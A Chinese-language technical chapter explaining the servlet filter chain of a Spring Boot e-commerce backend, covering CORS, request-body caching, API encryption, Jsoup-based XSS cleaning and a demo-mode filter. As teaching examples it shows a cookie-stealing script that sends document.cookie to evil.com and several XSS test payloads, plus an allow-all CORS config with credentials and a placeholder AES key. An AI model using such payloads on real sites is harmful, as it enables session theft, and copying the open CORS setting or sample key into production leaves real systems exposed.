# 过滤器链与安全防护设计

## 从一个请求的"安检之旅"说起

当一个 HTTP 请求到达电商后台的服务器时，它需要经过一系列"安检关卡"才能到达 Controller。这些关卡就是 Servlet Filter（过滤器），它们按照预定的顺序依次执行，每个 Filter 负责一个特定的关注点。

以一个商品管理的 POST 请求为例：

```
浏览器发送 POST /admin-api/product/spu
Content-Type: application/json
Body: {"name": "<script>alert('xss')</script>", "price": 99.00}

    │
    ▼
[第 1 关] CorsFilter          → 检查跨域，添加 CORS 响应头
    │
    ▼
[第 2 关] CacheRequestBodyFilter → 缓存 Body，使其可重复读取
    │
    ▼
[第 3 关] ApiEncryptFilter     → 如果有加密标头，解密请求 Body
    │
    ▼
[第 4 关] TenantContextFilter  → 从请求头提取租户 ID，设置上下文
    │
    ▼
[第 5 关] ApiAccessLogFilter   → 记录请求开始时间，准备访问日志
    │
    ▼
[第 6 关] XssFilter           → 清理 Query 参数中的 XSS 攻击代码
    │
    ▼
[第 7 关] Spring Security     → 认证、授权检查
    │
    ▼
[第 8 关] DemoFilter          → 如果是演示模式，拦截写操作
    │
    ▼
Controller 收到请求，Body 中的 XSS 已被 Jackson 反序列化器清理
```

本章详细讲解每个 Filter 的设计和实现。

## 过滤器执行顺序：WebFilterOrderEnum

Filter 的执行顺序至关重要。比如，CacheRequestBodyFilter 必须在 ApiEncryptFilter 之前执行，因为加密 Filter 需要读取 Body 来解密，而 Body 只能读取一次——CacheRequestBodyFilter 的作用就是让 Body 可以重复读取。

项目通过 `WebFilterOrderEnum` 统一管理所有 Filter 的顺序：

```java
// 文件：cn.iocoder.yudao.framework.common.enums.WebFilterOrderEnum

public interface WebFilterOrderEnum {
    int CORS_FILTER = Integer.MIN_VALUE;              // 最高优先级
    int TRACE_FILTER = CORS_FILTER + 1;
    int ENV_TAG_FILTER = TRACE_FILTER + 1;
    int REQUEST_BODY_CACHE_FILTER = Integer.MIN_VALUE + 500;
    int API_ENCRYPT_FILTER = REQUEST_BODY_CACHE_FILTER + 1;
    // OrderedRequestContextFilter 默认为 -105
    int TENANT_CONTEXT_FILTER = -104;
    int API_ACCESS_LOG_FILTER = -103;
    int XSS_FILTER = -102;
    // Spring Security Filter 默认为 -100
    int TENANT_SECURITY_FILTER = -99;
    int FLOWABLE_FILTER = -98;
    int DEMO_FILTER = Integer.MAX_VALUE;              // 最低优先级
}
```

执行顺序的设计逻辑：

```
Integer.MIN_VALUE  ← 数值越小，越先执行
    │
    ▼
CORS_FILTER                    跨域必须最先处理
TRACE_FILTER                   链路追踪标记
ENV_TAG_FILTER                 环境标签
    │
    ▼
REQUEST_BODY_CACHE_FILTER      缓存 Body（后续 Filter 需要重复读取）
API_ENCRYPT_FILTER             解密请求（依赖 Body 可重复读取）
    │
    ▼
(-105) OrderedRequestContextFilter  Spring 内置，国际化上下文
TENANT_CONTEXT_FILTER (-104)   租户上下文（需要在认证前设置）
API_ACCESS_LOG_FILTER (-103)   访问日志（记录请求 + 响应）
XSS_FILTER (-102)              XSS 清理
    │
    ▼
(-100) Spring Security Filter  认证、授权
TENANT_SECURITY_FILTER (-99)   租户安全检查（依赖认证信息）
FLOWABLE_FILTER (-98)          工作流相关
    │
    ▼
DEMO_FILTER (MAX_VALUE)        演示模式（最后执行，拦截写操作）
```

## CorsFilter：跨域请求的第一道门

### 为什么 CORS 必须最先处理？

CORS（Cross-Origin Resource Sharing）是一个 HTTP 协议层面的机制。浏览器在发送跨域请求前，会先发送一个 OPTIONS 预检请求（Preflight Request），询问服务器是否允许跨域。如果服务器的 CORS 响应头不正确，浏览器会直接拒绝后续请求。

CORS 检查发生在所有业务逻辑之前——浏览器甚至不会等到服务器处理完请求才检查 CORS 头。所以 CorsFilter 必须是第一个执行的 Filter。

### 实现

```java
// 文件：YudaoWebAutoConfiguration

@Bean
@Order(value = WebFilterOrderEnum.CORS_FILTER)
public FilterRegistrationBean<CorsFilter> corsFilterBean() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowCredentials(true);           // 允许携带 Cookie
    config.addAllowedOriginPattern("*");        // 允许所有来源
    config.addAllowedHeader("*");               // 允许所有请求头
    config.addAllowedMethod("*");               // 允许所有 HTTP 方法
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return createFilterBean(new CorsFilter(source), WebFilterOrderEnum.CORS_FILTER);
}
```

几个关键配置：

- `setAllowCredentials(true)`：允许前端携带 Cookie（如 Session ID）。注意，这个配置与 `addAllowedOrigin("*")` 不能同时使用（浏览器限制），所以项目用了 `addAllowedOriginPattern("*")` 代替。
- `addAllowedOriginPattern("*")`：允许所有来源的请求。生产环境中通常需要限制为特定域名，但作为脚手架项目，默认开放所有来源。
- `addAllowedHeader("*")`：允许所有自定义请求头。项目中使用了 `tenant-id`、`terminal` 等自定义头，需要显式允许。

## CacheRequestBodyFilter：让 Body 可重复读取

### 问题背景

HTTP 请求的 Body 是一个流（InputStream），只能读取一次。但项目中有多个组件需要读取 Body：

1. **ApiEncryptFilter**：需要读取 Body 来解密
2. **ApiAccessLogFilter**：需要读取 Body 来记录访问日志
3. **XssFilter**：需要读取 Body 来清理 XSS
4. **Spring MVC**：最终需要读取 Body 来反序列化为 Java 对象

如果每个组件都读取一次 Body，第二个组件就会读到空流。

### 解决方案

CacheRequestBodyFilter 用一个字节数组缓存了 Body 的内容，然后用 `CacheRequestBodyWrapper` 替换原始的 Request。后续的 Filter 和 Controller 读取 Body 时，实际上读取的是缓存的字节数组，可以无限次读取。

```java
// 文件：cn.iocoder.yudao.framework.web.core.filter.CacheRequestBodyFilter

public class CacheRequestBodyFilter extends OncePerRequestFilter {

    private static final String[] IGNORE_URIS = {"/admin/", "/actuator/"};

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain filterChain)
            throws IOException, ServletException {
        filterChain.doFilter(new CacheRequestBodyWrapper(request), response);
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        // 排除 Spring Boot Admin 和 Actuator 请求
        String requestURI = request.getRequestURI();
        if (StrUtil.startWithAny(requestURI, IGNORE_URIS)) {
            return true;
        }
        // 只处理 JSON 请求
        return !ServletUtils.isJsonRequest(request);
    }
}
```

`CacheRequestBodyWrapper` 的核心是重写了 `getInputStream()` 方法，返回一个基于字节数组的 `ServletInputStream`：

```java
// 文件：cn.iocoder.yudao.framework.web.core.filter.CacheRequestBodyWrapper

public class CacheRequestBodyWrapper extends HttpServletRequestWrapper {
    private final byte[] body;

    public CacheRequestBodyWrapper(HttpServletRequest request) {
        super(request);
        body = ServletUtils.getBodyBytes(request);  // 读取并缓存 Body
    }

    @Override
    public ServletInputStream getInputStream() {
        final ByteArrayInputStream inputStream = new ByteArrayInputStream(body);
        return new ServletInputStream() {
            @Override
            public int read() { return inputStream.read(); }
            // ... 其他方法
        };
    }
}
```

### 为什么只处理 JSON 请求？

`shouldNotFilter` 中检查了 `ServletUtils.isJsonRequest(request)`，只有 `Content-Type` 为 `application/json` 的请求才会被缓存。原因是：

1. JSON 请求的 Body 需要被多个组件读取
2. 文件上传请求（`multipart/form-data`）的 Body 可能很大，缓存会消耗大量内存
3. 表单请求（`application/x-www-form-urlencoded`）通常不需要重复读取

## XssFilter + XssRequestWrapper：第一层 XSS 防护

### XSS 攻击场景

在电商系统中，用户可以输入各种文本内容。如果输入中包含恶意脚本：

```
商品名称: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

当其他用户浏览商品时，这段脚本会在他们的浏览器中执行，窃取 Cookie 或执行其他恶意操作。

### 两层防护架构

项目的 XSS 防护分为两层：

```
请求进入
    │
    ├── Query 参数（?name=<script>...）
    │       │
    │       ▼
    │   XssFilter → XssRequestWrapper.getParameter()
    │       │
    │       ▼
    │   JsoupXssCleaner.clean()
    │       │
    │       ▼
    │   清理后的参数
    │
    └── JSON Body（{"name": "<script>..."}）
            │
            ▼
        XssStringJsonDeserializer（Jackson 反序列化时自动清理）
            │
            ▼
        JsoupXssCleaner.clean()
            │
            ▼
        清理后的字符串
```

**第一层：XssFilter + XssRequestWrapper**

XssFilter 用 `XssRequestWrapper` 包装原始请求。Wrapper 重写了 `getParameter()`、`getParameterValues()`、`getParameterMap()`、`getHeader()`、`getQueryString()` 等方法，在返回值前先通过 `XssCleaner` 清理。

```java
// 文件：cn.iocoder.yudao.framework.xss.core.filter.XssRequestWrapper

public class XssRequestWrapper extends HttpServletRequestWrapper {
    private final XssCleaner xssCleaner;

    @Override
    public String getParameter(String name) {
        String value = super.getParameter(name);
        return value == null ? null : xssCleaner.clean(value);
    }

    @Override
    public String[] getParameterValues(String name) {
        String[] values = super.getParameterValues(name);
        if (values == null) return null;
        String[] encodedValues = new String[values.length];
        for (int i = 0; i < values.length; i++) {
            encodedValues[i] = xssCleaner.clean(values[i]);
        }
        return encodedValues;
    }
    // ... getParameterMap(), getHeader(), getQueryString() 类似
}
```

**第二层：XssStringJsonDeserializer**

JSON Body 不经过 `getParameter()` 方法，而是通过 Jackson 的反序列化器直接解析。所以项目自定义了一个 `StringDeserializer`，在反序列化 String 类型时自动进行 XSS 清理：

```java
// 文件：cn.iocoder.yudao.framework.xss.core.json.XssStringJsonDeserializer

public class XssStringJsonDeserializer extends StringDeserializer {
    private final XssProperties properties;
    private final PathMatcher pathMatcher;
    private final XssCleaner xssCleaner;

    @Override
    public String deserialize(JsonParser p, DeserializationContext ctxt) throws IOException {
        // 1. 白名单 URL 跳过
        HttpServletRequest request = ServletUtils.getRequest();
        if (request != null) {
            String uri = request.getRequestURI();
            if (properties.getExcludeUrls().stream()
                    .anyMatch(excludeUrl -> pathMatcher.match(excludeUrl, uri))) {
                return p.getText();
            }
        }
        // 2. 清理 XSS
        if (p.hasToken(JsonToken.VALUE_STRING)) {
            return xssCleaner.clean(p.getText());
        }
        // ... 处理其他类型
    }
}
```

这个反序列化器通过 `Jackson2ObjectMapperBuilderCustomizer` 注册到全局的 ObjectMapper 中，所有 JSON 反序列化都会经过它。

### JsoupXssCleaner：基于白名单的清理

XSS 清理的核心是 `JsoupXssCleaner`，它基于 Jsoup 库的 `Safelist`（白名单）机制：

```java
// 文件：cn.iocoder.yudao.framework.xss.core.clean.JsoupXssCleaner

public class JsoupXssCleaner implements XssCleaner {
    private final Safelist safelist;
    private final String baseUri;

    public JsoupXssCleaner() {
        this.safelist = buildSafelist();
        this.baseUri = "";
    }

    private Safelist buildSafelist() {
        Safelist relaxedSafelist = Safelist.relaxed();
        // 允许 style 和 class 属性（富文本编辑需要）
        relaxedSafelist.addAttributes(":all", "style", "class");
        // 允许 a 标签的 target 属性
        relaxedSafelist.addAttributes("a", "target");
        // 允许 img 标签的 data 协议（base64 图片）
        relaxedSafelist.addProtocols("img", "src", "data");
        return relaxedSafelist;
    }

    @Override
    public String clean(String html) {
        return Jsoup.clean(html, baseUri, safelist,
                new Document.OutputSettings().prettyPrint(false));
    }
}
```

白名单规则基于 Jsoup 的 `Safelist.relaxed()`，在此基础上扩展了：
- 所有标签允许 `style` 和 `class` 属性（富文本编辑需要）
- `a` 标签允许 `target` 属性（控制链接打开方式）
- `img` 标签允许 `data` 协议（支持 base64 内联图片）

清理效果示例：

| 输入 | 输出 | 说明 |
|------|------|------|
| `<script>alert('xss')</script>` | `alert('xss')` | script 标签被移除，文本保留 |
| `<img src=x onerror=alert(1)>` | `<img src="x">` | onerror 事件被移除 |
| `<a href="javascript:alert(1)">click</a>` | `<a>click</a>` | javascript: 协议被移除 |
| `<p style="color:red">hello</p>` | `<p style="color:red">hello</p>` | style 属性被保留 |

## ApiEncryptFilter：API 加解密

### 设计动机

在某些场景下，HTTP 请求/响应的 Body 需要加密传输。比如：

- 前端传递用户的手机号、收货地址等敏感信息
- 支付接口的金额、订单号等关键数据
- 开放平台的 API 调用（防止中间人攻击）

### 工作原理

ApiEncryptFilter 的工作流程：

```
请求进入
    │
    ▼
检查请求头 X-Api-Encrypt 是否存在
    │
    ├── 不存在 → 直接放行
    │
    └── 存在 →
            │
            ▼
        读取加密的 Body
            │
            ▼
        使用密钥解密（AES 或 RSA）
            │
            ▼
        用解密后的 Body 替换原始 Body
            │
            ▼
        继续执行过滤器链
            │
            ▼
        Controller 处理正常的（已解密的）请求
            │
            ▼
        Controller 返回正常的响应
            │
            ▼
        ApiEncryptResponseWrapper 拦截响应
            │
            ▼
        使用密钥加密响应 Body
            │
            ▼
        添加 X-Api-Encrypt: true 响应头
            │
            ▼
        返回加密的响应给前端
```

### @ApiEncrypt 注解

加密不是全局的——只有标记了 `@ApiEncrypt` 注解的接口才会被加密：

```java
@Documented
@Target({ElementType.TYPE, ElementType.METHOD})
@Retention(RetentionPolicy.RUNTIME)
public @interface ApiEncrypt {
    boolean request() default true;   // 是否解密请求
    boolean response() default true;  // 是否加密响应
}
```

可以标注在类上（整个 Controller 的所有接口都加密）或方法上（只有特定接口加密）：

```java
@RestController
@RequestMapping("/admin-api/pay")
@ApiEncrypt  // 整个 Controller 的接口都加密
public class AdminPayController { ... }

@RestController
@RequestMapping("/admin-api/user")
public class AdminUserController {

    @PostMapping("/update-password")
    @ApiEncrypt  // 只有修改密码接口加密
    public CommonResult<Boolean> updatePassword(...) { ... }
}
```

### 为什么不使用 RequestBodyAdvice / ResponseBodyAdvice？

项目注释中解释了这个设计决策：

> 考虑到项目中会记录访问日志、异常日志，以及 HTTP API 签名等场景，最好是全局级、且提前做解析。

`RequestBodyAdvice` 和 `ResponseBodyAdvice` 是 Spring MVC 层的机制，它们在 Controller 方法执行前后触发。但访问日志 Filter（ApiAccessLogFilter）需要记录请求参数，如果请求参数是加密的，日志中记录的就只是一串密文，没有排查价值。

所以加密/解密必须在 Filter 层完成，而且要在 ApiAccessLogFilter 之前执行。

### 支持的加密算法

| 算法 | 类型 | 特点 | 适用场景 |
|------|------|------|---------|
| AES | 对称加密 | 前后端使用同一把密钥 | 内部系统，前端代码可控 |
| RSA | 非对称加密 | 前端用公钥加密，后端用私钥解密 | 开放平台，前端代码不可控 |

配置示例：

```yaml
yudao:
  api-encrypt:
    enable: true
    header: X-Api-Encrypt           # 加密标识请求头
    algorithm: AES                   # 加密算法
    request-key: 1234567890abcdef    # 请求解密密钥（AES: 密钥; RSA: 私钥）
    response-key: 1234567890abcdef   # 响应加密密钥（AES: 密钥; RSA: 公钥）
```

## DemoFilter：演示模式的"只读"保护

### 设计动机

项目提供在线演示环境，让用户体验功能。但演示环境中不能让用户随意修改数据（比如删除所有商品），否则会影响其他用户的体验。

### 实现

DemoFilter 只在 `yudao.demo=true` 时启用，拦截所有登录用户的写操作：

```java
// 文件：cn.iocoder.yudao.framework.web.core.filter.DemoFilter

public class DemoFilter extends OncePerRequestFilter {

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        String method = request.getMethod();
        // 只拦截写操作（POST/PUT/DELETE），且只拦截已登录用户
        return !StrUtil.equalsAnyIgnoreCase(method, "POST", "PUT", "DELETE")
                || WebFrameworkUtils.getLoginUserId(request) == null;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) {
        ServletUtils.writeJSON(response, CommonResult.error(DEMO_DENY));
    }
}
```

为什么只拦截已登录用户？因为未登录用户的 POST 请求通常是登录接口本身，拦截了就连登录都做不了了。

## 过滤器链的设计模式

### OncePerRequestFilter

项目中所有自定义 Filter 都继承了 `OncePerRequestFilter`。这是 Spring 提供的基类，保证每个请求只经过 Filter 一次。在请求转发（Forward）或包含（Include）等场景中，一个请求可能会多次经过同一个 Filter，`OncePerRequestFilter` 通过内部标记避免了重复执行。

### ApiRequestFilter：API 请求的抽象基类

`ApiAccessLogFilter` 和 `ApiEncryptFilter` 都继承了 `ApiRequestFilter`，它封装了"只处理 API 请求"的逻辑：

```java
// 文件：cn.iocoder.yudao.framework.web.core.filter.ApiRequestFilter

public abstract class ApiRequestFilter extends OncePerRequestFilter {
    protected final WebProperties webProperties;

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        String apiUri = request.getRequestURI()
                .substring(request.getContextPath().length());
        return !StrUtil.startWithAny(apiUri,
                webProperties.getAdminApi().getPrefix(),
                webProperties.getAppApi().getPrefix());
    }
}
```

只有以 `/admin-api` 或 `/app-api` 开头的请求才会被这些 Filter 处理。Actuator、静态资源、其他内部端点都不会被影响。

### Wrapper 模式

项目中大量使用了 Wrapper 模式来增强 HttpServletRequest / HttpServletResponse：

| Wrapper | 增强能力 |
|---------|---------|
| `CacheRequestBodyWrapper` | 让 Body 可重复读取 |
| `XssRequestWrapper` | 清理参数中的 XSS |
| `ApiDecryptRequestWrapper` | 解密请求 Body |
| `ApiEncryptResponseWrapper` | 加密响应 Body |

这些 Wrapper 的共同特点是：不修改原始请求/响应，而是通过继承 `HttpServletRequestWrapper` / `HttpServletResponseWrapper`，重写特定方法来实现增强。

## 本章小结

过滤器链的设计遵循三个原则：

1. **顺序决定正确性**：CORS 最先、Body 缓存次之、加密再次之、日志和 XSS 在安全检查之前、Spring Security 在中间、演示模式最后
2. **只处理 API 请求**：通过 `ApiRequestFilter` 基类，所有 API 相关的 Filter 只处理 `/admin-api` 和 `/app-api` 前缀的请求
3. **Wrapper 模式增强**：通过包装原始请求/响应，在不修改业务代码的情况下实现安全防护
